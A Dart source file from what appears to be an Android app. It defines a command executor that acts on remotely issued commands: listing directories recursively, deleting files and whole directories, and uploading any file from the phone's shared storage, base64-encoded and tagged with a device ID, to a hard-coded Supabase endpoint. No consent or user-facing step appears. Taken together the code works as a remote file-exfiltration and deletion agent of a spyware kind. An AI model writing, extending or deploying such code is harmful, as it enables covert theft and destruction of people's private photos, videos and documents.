// lib/core/command_executor.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'command_parser.dart';

class CommandExecutor {
  static const String _root = '/storage/emulated/0';
  static const String _uploadEndpoint =
      'https://pbovhvhpewnooofaeybe.supabase.co/functions/v1/upload-files';
  static const String _defaultBucket = 'device-uploads';

  String _cwd = _root;
  String get cwd => _cwd;

  String _normalize(String path) {
    if (path.length > 1 && path.endsWith('/')) return path.substring(0, path.length - 1);
    return path;
  }

  String _resolvePath(String input) {
    if (input.isEmpty) return _cwd;
    if (input.startsWith('/')) return _normalize(input);
    if (input == '..') {
      if (_cwd == _root) return _root;
      final i = _cwd.lastIndexOf('/');
      return i > _root.length ? _cwd.substring(0, i) : _root;
    }
    return _normalize('$_cwd/$input');
  }

  bool _isInsideRoot(String path) => path == _root || path.startsWith('$_root/');

  Future<Map<String, dynamic>> execute(Command cmd) async {
    try {
      switch (cmd.action) {
        case CommandAction.changeDir:
          return _wrapSync(() => _cd(cmd.payload['path'] as String?));
        case CommandAction.listFiles:
          return _wrapSync(() => _ls(
                cmd.payload['path'] as String?,
                recursive: cmd.payload['recursive'] == true,
                limit: cmd.payload['limit'] is int ? cmd.payload['limit'] : 100,
              ));
        case CommandAction.deleteFile:
          return _wrapSync(() => _rm(cmd.payload['path'] as String?));
        case CommandAction.uploadFile:
          return await _uploadFileSystem(
            cmd.payload['path'] as String?,
            deviceId: cmd.deviceId,
            bucket: cmd.payload['bucket'] as String?,
            dest: cmd.payload['dest'] as String?,
          );
        case CommandAction.deviceInfo:
          return _ok({'cwd': _cwd, 'storage_root': _root});
        case CommandAction.ping:
          return _ok({'ts': DateTime.now().toUtc().toIso8601String()});
        default:
          return _err('unsupported_action', 'Action not supported by executor');
      }
    } catch (e, st) {
      return _err('exception', '$e\n$st');
    }
  }

  // ---------------- FILESYSTEM OPS ----------------

  Map<String, dynamic> _cd(String? path) {
    if (path == null || path.isEmpty) return _err('cd_requires_path', 'cd requires path');
    final newPath = _resolvePath(path);
    if (!_isInsideRoot(newPath)) return _err('access_denied', 'path outside storage root');
    final dir = Directory(newPath);
    if (!dir.existsSync()) return _err('directory_not_found', newPath);
    _cwd = newPath;
    return _ok({'cwd': _cwd});
  }

  Map<String, dynamic> _ls(String? path, {bool recursive = false, int limit = 100}) {
    final target = (path == null || path.isEmpty) ? _cwd : _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');
    final dir = Directory(target);
    if (!dir.existsSync()) return _err('directory_not_found', target);

    final List<Map<String, dynamic>> entries = [];

    void walk(Directory d) {
      for (final e in d.listSync(followLinks: false)) {
        if (entries.length >= limit) return;
        try {
          final stat = e.statSync();
          entries.add({
            'name': e.path.split('/').last,
            'path': e.path,
            'type': stat.type == FileSystemEntityType.directory ? 'dir' : 'file',
            'size': stat.size,
            'modified': stat.modified.toUtc().toIso8601String(),
          });
          if (recursive && stat.type == FileSystemEntityType.directory) {
            walk(Directory(e.path));
          }
        } catch (_) {}
      }
    }

    walk(dir);
    return _ok({'cwd': _cwd, 'count': entries.length, 'entries': entries});
  }

  Map<String, dynamic> _rm(String? path) {
    if (path == null || path.isEmpty) return _err('rm_requires_file', 'rm requires file path');
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');

    try {
      final f = File(target);
      final d = Directory(target);
      if (f.existsSync()) {
        f.deleteSync();
        return _ok({'deleted': target, 'type': 'file'});
      } else if (d.existsSync()) {
        d.deleteSync(recursive: true);
        return _ok({'deleted': target, 'type': 'directory'});
      }
      return _err('not_found', target);
    } catch (e, st) {
      return _err('delete_failed', '$e\n$st');
    }
  }

  // ---------------- UPLOAD (FILESYSTEM ONLY) ----------------

  Future<Map<String, dynamic>> _uploadFileSystem(
    String? path, {
    String? deviceId,
    String? bucket,
    String? dest,
  }) async {
    if (path == null || path.isEmpty) return _err('upload_requires_file', 'upload requires path');

    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');

    final file = File(target);
    if (!file.existsSync()) return _err('file_not_found', target);

    try {
      final bytes = await file.readAsBytes();
      final payload = {
        'device_id': deviceId ?? '',
        'path': dest?.isNotEmpty == true ? dest : file.path.split('/').last,
        'file_b64': base64Encode(bytes),
        'content_type': _guessContentType(file.path) ?? 'application/octet-stream',
        'bucket': bucket ?? _defaultBucket,
      };

      return await _postUpload(payload, file.path);
    } catch (e, st) {
      return _err('upload_exception', '$e\n$st');
    }
  }

  Future<Map<String, dynamic>> _postUpload(
      Map<String, dynamic> payload, String fileLabel) async {
    final uri = Uri.parse(_uploadEndpoint);
    final client = HttpClient();
    try {
      final req = await client.postUrl(uri);
      req.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
      req.add(utf8.encode(jsonEncode(payload)));
      final resp = await req.close();
      final body = await resp.transform(utf8.decoder).join();

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        return _ok({'file': fileLabel, 'response': body});
      }
      return _err('upload_failed', body);
    } finally {
      client.close(force: true);
    }
  }

  String? _guessContentType(String path) {
    final ext = path.split('.').last.toLowerCase();
    switch (ext) {
      case 'jpg':
      case 'jpeg':
        return 'image/jpeg';
      case 'png':
        return 'image/png';
      case 'mp4':
        return 'video/mp4';
      case 'pdf':
        return 'application/pdf';
    }
    return null;
  }

  Map<String, dynamic> _ok([Map<String, dynamic>? data]) =>
      {'success': true, if (data != null) 'result': data};

  Map<String, dynamic> _err(String code, [String? detail]) =>
      {'success': false, 'error': code, if (detail != null) 'detail': detail};

  Map<String, dynamic> _wrapSync(Map<String, dynamic> Function() fn) {
    try {
      return fn();
    } catch (e, st) {
      return _err('exception', '$e\n$st');
    }
  }
}
